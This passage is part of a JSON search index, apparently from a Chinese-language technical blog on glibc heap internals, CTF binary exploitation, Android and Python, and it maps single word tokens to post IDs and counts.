":2}}],[\"inc\",{\"1\":{\"268\":4}}],[\"include<unistd\",{\"1\":{\"182\":1}}],[\"include<stdint\",{\"1\":{\"182\":1}}],[\"include<stdio\",{\"1\":{\"182\":1,\"255\":1}}],[\"include<stdlib\",{\"1\":{\"75\":1,\"182\":1}}],[\"include\",{\"1\":{\"75\":1,\"182\":1,\"189\":2,\"216\":1,\"243\":1,\"247\":1}}],[\"input\",{\"1\":{\"244\":1,\"245\":2,\"246\":1,\"248\":1,\"260\":5,\"264\":1,\"266\":2,\"271\":2,\"273\":5,\"276\":1,\"288\":3,\"290\":1}}],[\"inline\",{\"1\":{\"213\":1,\"224\":2,\"226\":1,\"227\":1}}],[\"inviisible\",{\"0\":{\"268\":1}}],[\"invocation\",{\"1\":{\"193\":2}}],[\"invalid\",{\"1\":{\"97\":3,\"109\":5,\"124\":2}}],[\"inserted\",{\"1\":{\"132\":1}}],[\"insert\",{\"1\":{\"106\":1}}],[\"instrumentation\",{\"1\":{\"27\":1}}],[\"install\",{\"0\":{\"4\":1},\"1\":{\"43\":1,\"47\":1}}],[\"inuse位\",{\"1\":{\"276\":1}}],[\"inuse变为0\",{\"1\":{\"153\":1}}],[\"inuse\",{\"1\":{\"90\":1,\"96\":1,\"97\":2,\"98\":2,\"100\":1,\"106\":3,\"109\":8,\"138\":1,\"153\":1}}],[\"init源码\",{\"1\":{\"195\":1}}],[\"init中初始化\",{\"1\":{\"138\":1}}],[\"init的时候初始化的\",{\"1\":{\"136\":1}}],[\"init\",{\"0\":{\"194\":1},\"1\":{\"64\":1,\"134\":1,\"138\":2,\"143\":1,\"144\":1,\"180\":60,\"188\":4,\"195\":3,\"201\":1,\"202\":2,\"244\":4,\"249\":1}}],[\"inrelease\",{\"1\":{\"46\":5}}],[\"index知道我们要绑定函数的名字\",{\"1\":{\"236\":1}}],[\"index5则可实现任意free\",{\"1\":{\"162\":1,\"284\":1}}],[\"index\",{\"0\":{\"236\":1},\"1\":{\"77\":1,\"90\":1,\"102\":1,\"103\":4,\"104\":4,\"109\":2,\"120\":1,\"124\":2,\"143\":11,\"144\":11,\"154\":6,\"165\":1,\"235\":1,\"236\":2,\"260\":10,\"265\":4,\"273\":10,\"276\":8,\"287\":1,\"288\":12}}],[\"indexof\",{\"1\":{\"22\":2,\"27\":1}}],[\"indicate\",{\"1\":{\"43\":2}}],[\"inetcache\",{\"1\":{\"27\":1}}],[\"int64\",{\"1\":{\"236\":1,\"244\":2}}],[\"into\",{\"1\":{\"109\":3,\"174\":1}}],[\"intruder\",{\"1\":{\"109\":1}}],[\"int类型\",{\"1\":{\"77\":1}}],[\"intermittent\",{\"0\":{\"267\":1}}],[\"interpreter\",{\"1\":{\"241\":1}}],[\"interp那么就会将ld找到\",{\"1\":{\"239\":1}}],[\"interactive\",{\"1\":{\"143\":1,\"144\":1,\"154\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"internal函数\",{\"1\":{\"202\":1}}],[\"internal\",{\"1\":{\"109\":3,\"132\":3,\"188\":2,\"193\":2,\"201\":1,\"202\":1}}],[\"interceptor\",{\"1\":{\"23\":1}}],[\"intent\",{\"0\":{\"39\":1},\"1\":{\"39\":2,\"40\":2}}],[\"intent的各种action\",{\"1\":{\"36\":1}}],[\"int\",{\"0\":{\"92\":1,\"109\":1,\"138\":1},\"1\":{\"19\":5,\"21\":3,\"75\":4,\"77\":3,\"92\":1,\"109\":4,\"120\":1,\"121\":1,\"124\":2,\"132\":3,\"133\":1,\"135\":2,\"137\":2,\"138\":2,\"174\":2,\"189\":1,\"195\":2,\"216\":1,\"223\":7,\"224\":2,\"226\":1,\"227\":1,\"236\":1,\"243\":2,\"244\":2,\"247\":8,\"254\":1,\"255\":3,\"258\":2,\"264\":1,\"268\":3,\"276\":2,\"288\":3}}],[\"info高位3字节\",{\"1\":{\"236\":1}}],[\"info结构实现\",{\"1\":{\"131\":1}}],[\"information\",{\"1\":{\"27\":1,\"137\":1}}],[\"info\",{\"1\":{\"9\":1,\"27\":1,\"109\":1,\"138\":3,\"223\":1,\"224\":3,\"227\":3,\"236\":6}}],[\"in\",{\"1\":{\"0\":1,\"64\":1,\"66\":2,\"90\":1,\"98\":2,\"103\":1,\"105\":1,\"106\":1,\"109\":6,\"127\":3,\"129\":1,\"132\":5,\"134\":1,\"138\":2,\"143\":3,\"144\":2,\"158\":2,\"161\":3,\"163\":4,\"165\":8,\"176\":1,\"193\":1,\"202\":3,\"213\":1,\"248\":2,\"252\":1,\"260\":6,\"265\":1,\"273\":8,\"276\":8,\"280\":2,\"283\":3,\"285\":4,\"287\":8,\"288\":23}}],[\"isoc99\",{\"1\":{\"255\":2}}],[\"is32\",{\"1\":{\"188\":1,\"204\":1}}],[\"isused被设置为0\",{\"1\":{\"78\":1}}],[\"isused来判断是否存在的\",{\"1\":{\"78\":1}}],[\"isused\",{\"1\":{\"77\":1,\"156\":1,\"159\":1,\"162\":2,\"276\":2,\"278\":1,\"281\":1,\"284\":2}}],[\"issue\",{\"1\":{\"55\":1}}],[\"istextwidgetactive\",{\"0\":{\"32\":1},\"1\":{\"30\":1,\"32\":1}}],[\"is\",{\"1\":{\"0\":1,\"27\":1,\"43\":2,\"71\":3,\"106\":1,\"109\":13,\"124\":2,\"132\":4,\"134\":1,\"137\":9,\"138\":3,\"176\":1,\"182\":1,\"195\":1,\"213\":2,\"255\":2}}],[\"b为fastbin\",{\"1\":{\"273\":1}}],[\"bss+520\",{\"1\":{\"290\":2}}],[\"bss+0x108\",{\"1\":{\"290\":1}}],[\"bss+0x100+0x44\",{\"1\":{\"271\":2}}],[\"bss+0x8\",{\"1\":{\"290\":1}}],[\"bss段\",{\"1\":{\"290\":1}}],[\"bss段标准输入输出流io地址信息\",{\"1\":{\"259\":1}}],[\"bss\",{\"1\":{\"258\":1,\"260\":3,\"271\":4,\"289\":4,\"290\":4}}],[\"blacklist\",{\"1\":{\"248\":2}}],[\"blocks\",{\"1\":{\"132\":1}}],[\"block\",{\"1\":{\"109\":3}}],[\"blog~\",{\"1\":{\"183\":1}}],[\"bloghome\",{\"1\":{\"0\":1}}],[\"blog\",{\"0\":{\"0\":1},\"1\":{\"0\":2}}],[\"break\",{\"1\":{\"138\":1,\"245\":1,\"247\":5}}],[\"brk函数申请\",{\"1\":{\"115\":1}}],[\"brk函数\",{\"1\":{\"112\":1}}],[\"brk\",{\"1\":{\"112\":1}}],[\"before\",{\"1\":{\"127\":1,\"202\":1}}],[\"below\",{\"1\":{\"124\":1}}],[\"because\",{\"1\":{\"109\":1}}],[\"beyond\",{\"1\":{\"109\":1}}],[\"been\",{\"1\":{\"109\":3,\"124\":1,\"138\":1}}],[\"be\",{\"1\":{\"92\":1,\"106\":1,\"109\":2,\"137\":1,\"202\":1,\"254\":1}}],[\"bck<\",{\"1\":{\"104\":1}}],[\"bck是头\",{\"1\":{\"104\":1}}],[\"bck赋值\",{\"0\":{\"103\":1}}],[\"bck为unsortedbin的头\",{\"1\":{\"98\":1}}],[\"bck\",{\"1\":{\"90\":4,\"91\":1,\"95\":1,\"97\":2,\"98\":1,\"99\":2,\"102\":2,\"103\":5,\"104\":12,\"106\":5,\"109\":8,\"110\":4}}],[\"buf\",{\"0\":{\"216\":1},\"1\":{\"173\":2,\"174\":1,\"175\":2,\"176\":1,\"193\":7,\"195\":2,\"215\":2,\"216\":6}}],[\"buffer\",{\"1\":{\"176\":1}}],[\"buff\",{\"1\":{\"156\":2,\"157\":1,\"162\":2,\"173\":1,\"276\":3,\"278\":2,\"279\":1,\"284\":2,\"288\":4}}],[\"but\",{\"1\":{\"109\":1,\"127\":1,\"132\":1,\"137\":1}}],[\"builtin\",{\"1\":{\"81\":2,\"109\":10,\"124\":4,\"129\":1,\"130\":1,\"163\":1,\"285\":1}}],[\"bugku\",{\"1\":{\"268\":1}}],[\"bug\",{\"1\":{\"60\":1}}],[\"bugfix一般用于解决问题\",{\"1\":{\"53\":1}}],[\"bk的低地址为0来让fd\",{\"1\":{\"150\":1}}],[\"bk都符合检查机制\",{\"1\":{\"148\":1}}],[\"bk都是指向的unsortedbin中第一个chunk\",{\"1\":{\"96\":1}}],[\"bk获取下一个chunk\",{\"1\":{\"129\":1}}],[\"bk构成的bins链\",{\"1\":{\"104\":1}}],[\"bk进行链接\",{\"1\":{\"93\":1}}],[\"bk链接chunk\",{\"1\":{\"93\":1}}],[\"bk去获取前面一个chunk的fd和后面一个chunk的bk\",{\"1\":{\"81\":1}}],[\"bk\",{\"1\":{\"80\":2,\"81\":4,\"93\":2,\"96\":1,\"104\":1,\"106\":1,\"109\":1,\"114\":2,\"129\":5,\"130\":6,\"143\":3,\"144\":3,\"150\":3,\"273\":1}}],[\"byobu\",{\"1\":{\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"byref\",{\"1\":{\"244\":4,\"254\":1,\"255\":1}}],[\"byte漏洞\",{\"1\":{\"272\":1}}],[\"bytearray\",{\"1\":{\"269\":5}}],[\"byte\",{\"0\":{\"272\":1},\"1\":{\"195\":1,\"244\":1,\"246\":1}}],[\"bytes=\",{\"1\":{\"249\":1}}],[\"bytes\",{\"1\":{\"90\":1,\"98\":1,\"100\":1,\"107\":1,\"109\":1,\"136\":3,\"276\":3,\"288\":3,\"290\":2}}],[\"by\",{\"0\":{\"130\":1},\"1\":{\"79\":1,\"85\":1,\"86\":1,\"109\":2,\"132\":2,\"138\":1,\"146\":1,\"150\":1,\"151\":1,\"176\":1,\"188\":3,\"265\":1,\"273\":1}}],[\"bd868465569400a6b9408050643e5949e8f2b8f5\",{\"1\":{\"59\":1}}],[\"bd86846\",{\"1\":{\"59\":1}}],[\"bios\",{\"1\":{\"219\":1}}],[\"bios将硬盘启动区中512b内容写入内存0x7c00位置\",{\"1\":{\"218\":1}}],[\"bionic\",{\"1\":{\"46\":5}}],[\"big\",{\"1\":{\"137\":1}}],[\"bitmap\",{\"1\":{\"132\":1}}],[\"bits\",{\"1\":{\"96\":1,\"97\":1}}],[\"bit\",{\"1\":{\"90\":1,\"100\":1,\"106\":1,\"109\":3}}],[\"binary\",{\"1\":{\"230\":1}}],[\"bin先被消耗掉\",{\"1\":{\"143\":1}}],[\"bin大小的chunk申请下来\",{\"1\":{\"142\":1}}],[\"bin是一个双向链表\",{\"1\":{\"142\":1}}],[\"bin是按照大小进行的排序\",{\"1\":{\"104\":1}}],[\"bin单个区间大小的链表长度最长为7个\",{\"1\":{\"142\":1}}],[\"binmapsize\",{\"1\":{\"132\":1}}],[\"binmap\",{\"1\":{\"132\":1}}],[\"bin上\",{\"1\":{\"132\":1}}],[\"bin合并free\",{\"1\":{\"115\":1}}],[\"bin无和是bin则遍历unsorted\",{\"1\":{\"115\":1}}],[\"bin找\",{\"1\":{\"115\":2}}],[\"bin链表的的头\",{\"1\":{\"106\":1}}],[\"bin则进行fwd和bck的赋值\",{\"1\":{\"103\":1}}],[\"bin的位置填满\",{\"1\":{\"143\":1}}],[\"bin的大小\",{\"1\":{\"142\":1}}],[\"bin的范围为\",{\"1\":{\"142\":1}}],[\"bin的链表\",{\"1\":{\"123\":1}}],[\"bin的chunk和top\",{\"1\":{\"143\":1}}],[\"bin的chunk\",{\"1\":{\"114\":1}}],[\"bin的头\",{\"1\":{\"106\":1}}],[\"bin的头部\",{\"1\":{\"93\":1,\"95\":1}}],[\"bin的入链操作\",{\"1\":{\"104\":1}}],[\"bin的相对位置\",{\"1\":{\"91\":1}}],[\"bin判断部分\",{\"1\":{\"90\":1}}],[\"bin里面\",{\"1\":{\"72\":1}}],[\"bin放满了\",{\"1\":{\"70\":1}}],[\"bin中第一个chunk的bk和最后一个chunk的fd都指向main\",{\"1\":{\"142\":1}}],[\"bin中的chunk\",{\"1\":{\"106\":1,\"143\":1}}],[\"bin中\",{\"1\":{\"69\":1}}],[\"bins等于30\",{\"1\":{\"223\":1}}],[\"bins是真正用来放置chunk双向链表的\",{\"1\":{\"132\":1}}],[\"bins是bins的高速缓冲区\",{\"1\":{\"132\":1}}],[\"bins和large\",{\"1\":{\"132\":2}}],[\"bins合并后的chunk都会进入unsorted\",{\"1\":{\"132\":1}}],[\"bins上\",{\"1\":{\"132\":1}}],[\"bins或者smallbin找\",{\"1\":{\"115\":1}}],[\"bins同理进行赋值\",{\"1\":{\"104\":1}}],[\"bins\",{\"1\":{\"69\":1,\"71\":2,\"72\":1,\"109\":2,\"127\":1,\"132\":6,\"223\":1}}],[\"bins中\",{\"1\":{\"69\":1}}],[\"bin\",{\"0\":{\"92\":1,\"119\":1},\"1\":{\"43\":4,\"70\":1,\"90\":6,\"92\":1,\"102\":1,\"103\":3,\"104\":2,\"106\":3,\"109\":2,\"124\":1,\"132\":5,\"143\":1,\"161\":1,\"165\":3,\"224\":14,\"226\":8,\"227\":7,\"258\":1,\"270\":1,\"271\":1,\"276\":1,\"283\":1,\"287\":3,\"288\":5}}],[\"b6f507652425\",{\"1\":{\"43\":3}}],[\"b=456\",{\"1\":{\"17\":1}}],[\"b\",{\"1\":{\"17\":3,\"19\":1,\"143\":15,\"144\":15,\"150\":1,\"152\":2,\"153\":1,\"154\":7,\"158\":2,\"161\":5,\"162\":1,\"163\":4,\"165\":11,\"249\":1,\"256\":3,\"258\":13,\"260\":16,\"264\":9,\"265\":13,\"266\":8,\"267\":8,\"268\":12,\"269\":7,\"270\":2,\"271\":12,\"273\":18,\"276\":26,\"280\":2,\"283\":5,\"284\":1,\"285\":4,\"287\":11,\"288\":56,\"289\":5,\"290\":5}}],[\"borders\",{\"1\":{\"109\":1}}],[\"bordering\",{\"1\":{\"109\":2}}],[\"boundaries\",{\"1\":{\"109\":1}}],[\"bookstack\",{\"1\":{\"221\":1,\"222\":1}}],[\"book123\",{\"1\":{\"9\":1}}],[\"bootlin\",{\"1\":{\"116\":1}}],[\"booleans\",{\"1\":{\"132\":1}}],[\"bool\",{\"1\":{\"109\":1,\"132\":1,\"137\":1}}],[\"both\",{\"1\":{\"0\":1}}],[\"babygift\",{\"0\":{\"258\":1}}],[\"banana\",{\"1\":{\"252\":2}}],[\"bambooiii\",{\"1\":{\"183\":1}}],[\"barrier\",{\"1\":{\"134\":2,\"138\":2}}],[\"ba25a9d\",{\"1\":{\"59\":1}}],[\"baidu\",{\"1\":{\"46\":2}}],[\"bad\",{\"1\":{\"46\":7,\"202\":1}}],[\"badge\",{\"0\":{\"5\":1}}],[\"bash\",{\"1\":{\"43\":2}}],[\"baselibc\",{\"1\":{\"266\":2}}],[\"base和\",{\"1\":{\"216\":1}}],[\"base进行劫持\",{\"0\":{\"216\":1}}],[\"base\",{\"1\":{\"23\":2,\"132\":1,\"158\":2,\"163\":1,\"165\":10,\"175\":5,\"182\":6,\"193\":15,\"195\":5,\"211\":5,\"215\":1,\"258\":3,\"260\":5,\"264\":8,\"273\":23,\"276\":9,\"280\":2,\"285\":1,\"287\":10,\"288\":34}}],[\"backdoor\",{\"1\":{\"182\":5,\"265\":2}}],[\"backdoor地址之类的\",{\"1\":{\"173\":1}}],[\"backup\",{\"1\":{\"175\":2,\"193\":4,\"195\":1}}],[\"backing\",{\"1\":{\"175\":1,\"193\":1}}],[\"backward\",{\"1\":{\"109\":1}}],[\"backports\",{\"1\":{\"46\":1}}],[\"backtrace\",{\"1\":{\"30\":2,\"32\":1}}],[\"background\",{\"0\":{\"3\":1}}],[\"srop+orw\",{\"1\":{\"290\":1}}],[\"srop\",{\"0\":{\"290\":1}}],[\"save\",{\"1\":{\"175\":2,\"193\":6,\"195\":2}}],[\"sa\",{\"1\":{\"154\":2,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"same\",{\"1\":{\"109\":1,\"124\":1}}],[\"slice\",{\"1\":{\"276\":2}}],[\"sleep\",{\"1\":{\"265\":1,\"273\":1,\"289\":1,\"290\":1}}],[\"slot里面\",{\"1\":{\"226\":1}}],[\"slot\",{\"1\":{\"223\":6,\"224\":10,\"226\":7,\"227\":5}}],[\"slow\",{\"1\":{\"213\":1,\"224\":1,\"226\":1}}],[\"sla\",{\"1\":{\"154\":7,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"sl\",{\"1\":{\"154\":1,\"165\":1,\"258\":4,\"260\":5,\"264\":2,\"265\":4,\"266\":1,\"267\":1,\"268\":1,\"269\":9,\"271\":1,\"273\":10,\"276\":9,\"287\":1,\"288\":13,\"289\":1,\"290\":1}}],[\"sd\",{\"1\":{\"154\":1,\"258\":2,\"260\":2,\"264\":2,\"265\":3,\"266\":3,\"267\":2,\"268\":3,\"269\":1,\"271\":3,\"273\":2,\"276\":2,\"288\":2,\"289\":3,\"290\":3}}],[\"sdk版本\",{\"1\":{\"37\":1}}],[\"screen\",{\"1\":{\"249\":1}}],[\"scache中查找文件\",{\"1\":{\"238\":1}}],[\"scanf和fmt类似\",{\"1\":{\"261\":1}}],[\"scanf\",{\"1\":{\"75\":1,\"216\":2,\"255\":3}}],[\"sched\",{\"1\":{\"137\":1}}],[\"syscall+bytes\",{\"1\":{\"290\":2}}],[\"syscall\",{\"1\":{\"268\":2,\"290\":4}}],[\"systrim\",{\"1\":{\"109\":1}}],[\"system\",{\"1\":{\"20\":1,\"21\":2,\"27\":1,\"43\":2,\"109\":1,\"124\":1,\"132\":3,\"137\":1,\"138\":1,\"165\":5,\"189\":1,\"248\":1,\"254\":1,\"258\":2,\"260\":7,\"264\":3,\"276\":4,\"287\":5}}],[\"sym\",{\"1\":{\"236\":2}}],[\"sync\",{\"1\":{\"180\":9,\"186\":2}}],[\"synchronize\",{\"1\":{\"134\":1,\"138\":1}}],[\"sub\",{\"1\":{\"220\":2,\"244\":1,\"245\":1,\"258\":1,\"268\":2}}],[\"support\",{\"1\":{\"132\":1,\"175\":1,\"193\":1}}],[\"succeeds\",{\"1\":{\"127\":1}}],[\"sure\",{\"1\":{\"109\":1,\"174\":1}}],[\"surrounding\",{\"1\":{\"109\":1}}],[\"s\",{\"0\":{\"277\":1,\"288\":1},\"1\":{\"127\":2,\"154\":10,\"183\":1,\"216\":2,\"249\":1,\"254\":1,\"256\":1,\"258\":10,\"260\":10,\"264\":10,\"265\":10,\"266\":10,\"267\":10,\"268\":10,\"269\":10,\"271\":10,\"273\":10,\"276\":10,\"288\":11,\"289\":10,\"290\":10}}],[\"simple\",{\"0\":{\"290\":1}}],[\"siscn\",{\"0\":{\"254\":1}}],[\"sigframe4\",{\"1\":{\"290\":7}}],[\"sigframe4=sigreturnframe\",{\"1\":{\"290\":1}}],[\"sigframe3\",{\"1\":{\"290\":7}}],[\"sigframe3=sigreturnframe\",{\"1\":{\"290\":1}}],[\"sigframe2\",{\"1\":{\"290\":7}}],[\"sigframe2=sigreturnframe\",{\"1\":{\"290\":1}}],[\"sigframe\",{\"1\":{\"290\":7}}],[\"sigframe=sigreturnframe\",{\"1\":{\"290\":1}}],[\"sigreturn\",{\"1\":{\"290\":3}}],[\"sighandler\",{\"1\":{\"244\":1,\"246\":1}}],[\"signal\",{\"1\":{\"244\":1,\"246\":1}}],[\"sigsetjmp\",{\"1\":{\"244\":1,\"246\":1}}],[\"si复制到es\",{\"1\":{\"220\":1}}],[\"si\",{\"1\":{\"220\":3}}],[\"since\",{\"1\":{\"137\":1}}],[\"single\",{\"1\":{\"109\":3,\"138\":1}}],[\"size和fd\",{\"1\":{\"150\":1}}],[\"size=0xa8\",{\"1\":{\"143\":1,\"144\":1}}],[\"size==\",{\"1\":{\"104\":1}}],[\"sized\",{\"1\":{\"138\":1}}],[\"sizeof\",{\"1\":{\"138\":4,\"174\":3,\"188\":1,\"192\":1,\"223\":2,\"224\":1,\"227\":1}}],[\"size来定的\",{\"1\":{\"130\":1}}],[\"size来存东西\",{\"1\":{\"74\":1}}],[\"size是否等于这个size\",{\"1\":{\"129\":1}}],[\"size是否与p的大小相同\",{\"1\":{\"81\":1}}],[\"size检查\",{\"1\":{\"124\":1}}],[\"size有且仅当\",{\"1\":{\"114\":1}}],[\"size+size\",{\"1\":{\"124\":1}}],[\"size+size+fd+data\",{\"1\":{\"114\":1}}],[\"size+sz<size<system\",{\"1\":{\"109\":1}}],[\"size+prevsize也就是新的chunk的大小\",{\"1\":{\"109\":1}}],[\"size作为上一个chunk的size大小\",{\"1\":{\"109\":1}}],[\"size部分\",{\"1\":{\"106\":1}}],[\"size的空间\",{\"1\":{\"115\":1}}],[\"size的large\",{\"1\":{\"106\":1}}],[\"size的\",{\"1\":{\"106\":1}}],[\"size的链\",{\"1\":{\"104\":2}}],[\"size的情况\",{\"1\":{\"104\":1}}],[\"size的入链操作\",{\"1\":{\"102\":1}}],[\"size大于large中所有的chunk\",{\"1\":{\"104\":1}}],[\"size大小\",{\"1\":{\"88\":1}}],[\"size链中的首个chunk\",{\"1\":{\"106\":1}}],[\"size链操作\",{\"1\":{\"104\":1}}],[\"size链\",{\"0\":{\"104\":1}}],[\"size链表的值\",{\"1\":{\"106\":1}}],[\"size链表的头部和尾部\",{\"1\":{\"93\":1}}],[\"size链表\",{\"1\":{\"104\":1,\"106\":1}}],[\"size链表之间通过fd\",{\"1\":{\"93\":1}}],[\"size得出的chunk的size大小是否等于我们的prev\",{\"1\":{\"88\":1}}],[\"size\",{\"1\":{\"43\":1,\"71\":1,\"75\":7,\"77\":1,\"78\":1,\"81\":3,\"87\":1,\"95\":2,\"96\":1,\"97\":18,\"98\":6,\"100\":1,\"103\":2,\"104\":3,\"106\":10,\"109\":46,\"114\":3,\"120\":1,\"124\":13,\"127\":2,\"129\":3,\"130\":8,\"132\":3,\"136\":3,\"137\":6,\"138\":5,\"143\":19,\"144\":19,\"150\":1,\"152\":1,\"153\":2,\"154\":5,\"156\":1,\"162\":6,\"165\":1,\"174\":2,\"182\":16,\"186\":2,\"223\":3,\"224\":9,\"226\":6,\"227\":3,\"269\":2,\"273\":5,\"276\":9,\"278\":1,\"284\":6,\"287\":1,\"288\":4}}],[\"skill\",{\"0\":{\"303\":1}}],[\"skip\",{\"1\":{\"106\":1}}],[\"skysider\",{\"1\":{\"44\":1,\"45\":1}}],[\"small\",{\"0\":{\"102\":1,\"224\":1},\"1\":{\"103\":1,\"129\":1,\"132\":3,\"223\":1,\"224\":3,\"226\":2,\"227\":1}}],[\"smallbin的fwd\",{\"0\":{\"103\":1}}],[\"smallbin\",{\"1\":{\"90\":3,\"98\":2,\"103\":2,\"105\":1,\"106\":1,\"109\":1,\"129\":1,\"132\":1}}],[\"sz然后必须<=av\",{\"1\":{\"124\":1}}],[\"sz不能大于av\",{\"1\":{\"97\":1}}],[\"sz\",{\"1\":{\"74\":1,\"97\":2,\"109\":5,\"124\":3}}],[\"switch\",{\"1\":{\"43\":1,\"247\":1}}],[\"switching\",{\"1\":{\"43\":1}}],[\"sp\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"split\",{\"1\":{\"132\":1}}],[\"space\",{\"1\":{\"109\":2,\"137\":1,\"249\":1}}],[\"spawned\",{\"1\":{\"27\":1}}],[\"spawn\",{\"1\":{\"27\":1}}],[\"special\",{\"1\":{\"55\":1}}],[\"specified\",{\"1\":{\"43\":2}}],[\"short\",{\"1\":{\"193\":1}}],[\"shortbuf\",{\"1\":{\"175\":1,\"193\":3}}],[\"showmany\",{\"1\":{\"186\":1}}],[\"showmanyc\",{\"1\":{\"180\":6,\"186\":2}}],[\"show函数\",{\"1\":{\"141\":1}}],[\"show\",{\"1\":{\"59\":2,\"141\":1,\"143\":1,\"144\":1,\"153\":1,\"154\":2,\"260\":2,\"267\":1,\"268\":3}}],[\"should\",{\"1\":{\"0\":1,\"254\":1}}],[\"sh\",{\"1\":{\"43\":2,\"165\":3,\"189\":1,\"258\":1,\"270\":1,\"271\":1,\"276\":1,\"287\":3,\"288\":5}}],[\"shellcode=\",{\"1\":{\"268\":1}}],[\"shellcode\",{\"1\":{\"267\":2,\"268\":13,\"271\":8,\"289\":2}}],[\"shellcode3\",{\"1\":{\"267\":1}}],[\"shellcode2\",{\"1\":{\"267\":1}}],[\"shellcode1\",{\"1\":{\"267\":2}}],[\"shell\",{\"1\":{\"29\":1,\"30\":1,\"248\":1,\"251\":4}}],[\"so的man手册\",{\"1\":{\"237\":1}}],[\"source\",{\"0\":{\"300\":1},\"1\":{\"116\":1}}],[\"some\",{\"1\":{\"109\":2}}],[\"so中\",{\"1\":{\"69\":1}}],[\"so中的函数\",{\"0\":{\"23\":1}}],[\"so\",{\"1\":{\"23\":5,\"27\":1,\"106\":1,\"109\":2,\"112\":1,\"127\":1,\"137\":1,\"138\":1,\"154\":2,\"207\":1,\"237\":1,\"238\":1,\"240\":1,\"241\":3}}],[\"so名称\",{\"1\":{\"23\":1}}],[\"stop\",{\"1\":{\"213\":1,\"273\":1}}],[\"store\",{\"1\":{\"109\":1}}],[\"step\",{\"1\":{\"182\":8,\"193\":4}}],[\"stdio\",{\"1\":{\"216\":1}}],[\"stdin\",{\"1\":{\"75\":1,\"182\":1}}],[\"stderr2\",{\"1\":{\"182\":5}}],[\"stderr\",{\"1\":{\"182\":14,\"202\":2}}],[\"stdout\",{\"1\":{\"182\":1}}],[\"stuff\",{\"1\":{\"174\":1}}],[\"studio在mainactivity之前运行\",{\"1\":{\"36\":1,\"38\":1}}],[\"studio中改变默认的启动activity\",{\"1\":{\"36\":1,\"38\":1}}],[\"students\",{\"1\":{\"154\":1}}],[\"student\",{\"1\":{\"17\":2,\"19\":5,\"20\":4,\"21\":6,\"154\":2}}],[\"student=java\",{\"1\":{\"17\":1,\"19\":2,\"20\":1,\"21\":1}}],[\"st\",{\"1\":{\"77\":4,\"236\":5}}],[\"st数据看起来是关键\",{\"1\":{\"77\":1}}],[\"stack\",{\"0\":{\"302\":1},\"1\":{\"216\":3,\"254\":1,\"258\":3,\"270\":1}}],[\"start\",{\"1\":{\"64\":1,\"175\":4,\"193\":4,\"213\":2,\"243\":3}}],[\"stat\",{\"1\":{\"180\":6,\"186\":2,\"223\":1,\"224\":2,\"226\":1,\"227\":1}}],[\"statep\",{\"1\":{\"193\":2}}],[\"state结构体来管理内存的分配等一系列操作\",{\"1\":{\"132\":1}}],[\"state\",{\"1\":{\"131\":1,\"132\":4,\"134\":1,\"138\":1,\"175\":2,\"193\":6}}],[\"statistics\",{\"1\":{\"46\":1}}],[\"static\",{\"0\":{\"289\":1},\"1\":{\"19\":4,\"20\":1,\"21\":2,\"71\":1,\"109\":1,\"129\":1,\"136\":1,\"137\":2,\"138\":2,\"213\":1,\"224\":2,\"226\":1,\"227\":1,\"289\":1}}],[\"status\",{\"1\":{\"43\":1}}],[\"style\",{\"1\":{\"50\":1}}],[\"strcpy\",{\"1\":{\"245\":1}}],[\"stru\",{\"1\":{\"244\":3,\"245\":2}}],[\"struct管理tcache\",{\"1\":{\"123\":1}}],[\"struct\",{\"1\":{\"71\":8,\"77\":1,\"93\":2,\"114\":1,\"132\":4,\"174\":5,\"175\":3,\"176\":1,\"180\":4,\"184\":2,\"186\":1,\"188\":5,\"192\":5,\"193\":3,\"195\":3,\"202\":2,\"213\":2,\"223\":3,\"236\":1}}],[\"strfile\",{\"1\":{\"176\":1}}],[\"stream\",{\"1\":{\"174\":1,\"195\":1}}],[\"str\",{\"1\":{\"19\":2,\"143\":6,\"144\":6,\"154\":5,\"260\":3,\"265\":1,\"269\":4,\"273\":5,\"276\":4,\"288\":9}}],[\"string\",{\"1\":{\"19\":4,\"20\":1,\"21\":4,\"30\":3,\"77\":2}}],[\"search\",{\"1\":{\"249\":1}}],[\"sem\",{\"1\":{\"244\":5,\"245\":4}}],[\"serialized\",{\"1\":{\"132\":2}}],[\"serialize\",{\"1\":{\"132\":1}}],[\"service\",{\"1\":{\"46\":2}}],[\"sendfile函数\",{\"1\":{\"268\":1}}],[\"sendfile64\",{\"1\":{\"268\":1}}],[\"sendafter\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"sendlineafter\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"sendline\",{\"1\":{\"143\":7,\"144\":7,\"154\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":2,\"289\":1,\"290\":1}}],[\"send的返回值是yield右侧的值\",{\"1\":{\"66\":1}}],[\"send\",{\"1\":{\"66\":3,\"143\":1,\"144\":1,\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"270\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"self\",{\"1\":{\"64\":14,\"143\":23,\"144\":23}}],[\"section\",{\"